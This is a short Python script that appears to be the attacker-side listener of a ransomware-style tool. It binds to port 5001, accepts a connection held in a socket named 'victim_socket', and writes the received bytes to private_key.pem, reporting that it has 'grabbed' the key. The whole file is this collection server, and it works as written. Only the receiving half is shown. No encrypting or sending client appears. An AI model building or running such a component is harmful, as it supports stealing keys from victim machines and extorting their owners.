import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5001
# receive 4096 bytes each time
BUFFER_SIZE = 4096
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"< ☺ > Listening as {SERVER_HOST}:{SERVER_PORT}....")
victim_socket, address = s.accept() 


with open("private_key.pem", "wb") as f:
    bytes_read = victim_socket.recv(BUFFER_SIZE)
    f.write(bytes_read)
    print(f'grabbed our generated key from: {address}')
print("successfully obtained private key")
        
victim_socket.close()
s.close()

